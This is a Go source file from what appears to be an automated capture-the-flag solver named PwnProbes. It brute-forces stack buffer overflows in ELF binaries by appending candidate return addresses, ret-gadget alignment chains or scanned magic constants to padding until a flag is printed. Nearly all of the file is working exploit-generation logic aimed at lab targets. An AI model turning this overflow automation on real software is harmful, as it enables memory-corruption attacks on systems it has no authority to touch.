package solve

import (
	"context"
	"debug/elf"
	"encoding/binary"
	"fmt"
	"sort"

	"github.com/MoriartyPuth/PwnProbes/internal/inspect"
)

// maxOverwriteAttempts bounds the brute force so a stubborn target cannot run
// unboundedly. Simple labs solve in far fewer attempts.
const maxOverwriteAttempts = 4000

// tail is one candidate suffix appended after the padding, with a label used in
// the attempt note so a solve is explainable and reproducible.
type tail struct {
	bytes []byte
	note  string
}

// stackOverwriteStrategy brute-forces a line-based overflow. A flag that then
// appears in the output (and not in the payload) means the overflow redirected
// control to a flag-printing function or set a guard variable to its required
// constant. The return-address candidates (few) are swept across all padding
// lengths first, then the magic-constant candidates (potentially many), so a
// large constant pool can never crowd a ret2win offset out of the search.
// Newlines in a candidate are skipped because the target reads one line.
func (s *solver) stackOverwriteStrategy(ctx context.Context) (bool, error) {
	funcTails, magicTails, err := overwriteTails(s.path, s.report.Binary)
	if err != nil {
		return false, err
	}
	if len(funcTails)+len(magicTails) == 0 {
		s.report.Limitations = append(s.report.Limitations, "no magic constants or function addresses extracted; overwrite strategy had nothing to try")
		return false, nil
	}
	attempts := 0
	for _, phase := range [][]tail{funcTails, magicTails} {
		for _, pad := range paddingLengths() {
			for _, t := range phase {
				if err := ctx.Err(); err != nil {
					return false, err
				}
				if attempts >= maxOverwriteAttempts {
					s.report.Limitations = append(s.report.Limitations, fmt.Sprintf("overwrite brute force stopped at the %d-attempt cap", maxOverwriteAttempts))
					return false, nil
				}
				attempts++
				payload := make([]byte, 0, pad+len(t.bytes))
				for i := 0; i < pad; i++ {
					payload = append(payload, 'A')
				}
				payload = append(payload, t.bytes...)
				note := fmt.Sprintf("padding=%d tail=%s", pad, t.note)
				if done, err := s.attempt(ctx, "stack_overwrite", note, payload, false); err != nil || done {
					return done, err
				}
			}
		}
	}
	return false, nil
}

// paddingLengths lists overflow lengths to try, front-loading the offsets that
// commonly align a 32-byte buffer with an adjacent variable or a saved frame,
// then filling the rest of an 8..128 sweep on a 4-byte step.
func paddingLengths() []int {
	order := []int{32, 36, 40, 44, 48, 24, 28, 56, 52, 64, 20, 16}
	seen := map[int]bool{}
	out := []int{}
	for _, v := range order {
		if !seen[v] {
			seen[v] = true
			out = append(out, v)
		}
	}
	for v := 8; v <= 128; v += 4 {
		if !seen[v] {
			seen[v] = true
			out = append(out, v)
		}
	}
	return out
}

// overwriteTails builds the candidate suffixes in two groups: function-address
// redirections (return address, optionally preceded by a stack-aligning ret)
// and 4-byte magic constants scanned from the executable sections (for
// variable-overwrite guards such as a required auth value). They are returned
// separately so the caller can exhaust the small, high-value function group
// before the potentially large constant pool. Candidates containing a newline
// are dropped because the target reads a single line.
func overwriteTails(path string, bin inspect.Report) (funcTails, magicTails []tail, err error) {
	f, err := elf.Open(path)
	if err != nil {
		return nil, nil, err
	}
	defer f.Close()

	// Return-address redirection only makes sense for fixed addresses; skip it
	// when PIE is enabled, where the load base is unknown without a leak.
	if bin.Protections["pie"].Status != "enabled" {
		width := 8
		if bin.Bits == 32 {
			width = 4
		}
		ret, haveRet := retGadget(f)
		for _, addr := range functionAddresses(bin) {
			b := addrBytes(addr, width)
			if !containsNewline(b) {
				funcTails = append(funcTails, tail{bytes: b, note: fmt.Sprintf("retaddr=0x%x", addr)})
			}
			// Alignment variant: prepend a bare `ret` so the called function
			// starts with RSP shifted by one word. On 64-bit, a function that
			// calls into libc (printf, system) faults on a movaps when RSP is
			// not 16-byte aligned; the extra ret fixes the common case.
			if haveRet && width == 8 {
				chain := append(addrBytes(ret, width), b...)
				if !containsNewline(chain) {
					funcTails = append(funcTails, tail{bytes: chain, note: fmt.Sprintf("ret_align+retaddr=0x%x", addr)})
				}
			}
		}
	}

	lo, hi := loadableRange(f)
	for _, m := range scanMagics(f, lo, hi) {
		b := make([]byte, 4)
		binary.LittleEndian.PutUint32(b, m)
		if containsNewline(b) {
			continue
		}
		magicTails = append(magicTails, tail{bytes: b, note: fmt.Sprintf("magic32=0x%08x", m)})
	}
	return funcTails, magicTails, nil
}

func addrBytes(addr uint64, width int) []byte {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, addr)
	return b[:width]
}

// retGadget returns the address of a bare `ret` (0xc3) byte in an executable
// section, used to realign the stack before a ret2win call.
func retGadget(f *elf.File) (uint64, bool) {
	for _, sec := range f.Sections {
		if sec.Type != elf.SHT_PROGBITS || sec.Flags&elf.SHF_EXECINSTR == 0 {
			continue
		}
		data, err := sec.Data()
		if err != nil {
			continue
		}
		for i, c := range data {
			if c == 0xc3 {
				return sec.Addr + uint64(i), true
			}
		}
	}
	return 0, false
}

func loadableRange(f *elf.File) (lo, hi uint64) {
	lo = ^uint64(0)
	for _, p := range f.Progs {
		if p.Type != elf.PT_LOAD {
			continue
		}
		if p.Vaddr < lo {
			lo = p.Vaddr
		}
		if end := p.Vaddr + p.Memsz; end > hi {
			hi = end
		}
	}
	if lo == ^uint64(0) {
		lo = 0
	}
	return lo, hi
}

// scanMagics slides a 4-byte window over every executable section and keeps the
// little-endian values that look like intentional constants rather than code
// addresses, string bytes, padding, or small numbers. It returns them in
// ascending order for a deterministic brute force.
func scanMagics(f *elf.File, lo, hi uint64) []uint32 {
	set := map[uint32]bool{}
	for _, sec := range f.Sections {
		if sec.Type != elf.SHT_PROGBITS || sec.Flags&elf.SHF_EXECINSTR == 0 {
			continue
		}
		data, err := sec.Data()
		if err != nil {
			continue
		}
		for i := 0; i+4 <= len(data); i++ {
			v := binary.LittleEndian.Uint32(data[i : i+4])
			if !interestingMagic(v, lo, hi) {
				continue
			}
			set[v] = true
		}
	}
	out := make([]uint32, 0, len(set))
	for v := range set {
		out = append(out, v)
	}
	sort.Slice(out, func(i, j int) bool { return out[i] < out[j] })
	return out
}

func interestingMagic(v uint32, lo, hi uint64) bool {
	if v < 0x00010000 || v == 0xffffffff {
		return false // too small to be a guard constant, or an all-ones fill
	}
	if uint64(v) >= lo && uint64(v) < hi {
		return false // falls inside a loaded segment: likely an address, not a guard
	}
	b := [4]byte{byte(v), byte(v >> 8), byte(v >> 16), byte(v >> 24)}
	allSame, allPrintable := true, true
	for _, c := range b {
		if c != b[0] {
			allSame = false
		}
		if c < 0x20 || c > 0x7e {
			allPrintable = false
		}
	}
	if allSame || allPrintable {
		return false // repeated fill byte, or ASCII string data
	}
	return true
}

func functionAddresses(bin inspect.Report) []uint64 {
	out := []uint64{}
	seen := map[uint64]bool{}
	for _, fn := range bin.Functions {
		var addr uint64
		if _, err := fmt.Sscanf(fn.Address, "0x%x", &addr); err != nil || addr == 0 {
			continue
		}
		if seen[addr] {
			continue
		}
		seen[addr] = true
		out = append(out, addr)
	}
	sort.Slice(out, func(i, j int) bool { return out[i] < out[j] })
	return out
}

func containsNewline(b []byte) bool {
	for _, c := range b {
		if c == '\n' {
			return true
		}
	}
	return false
}
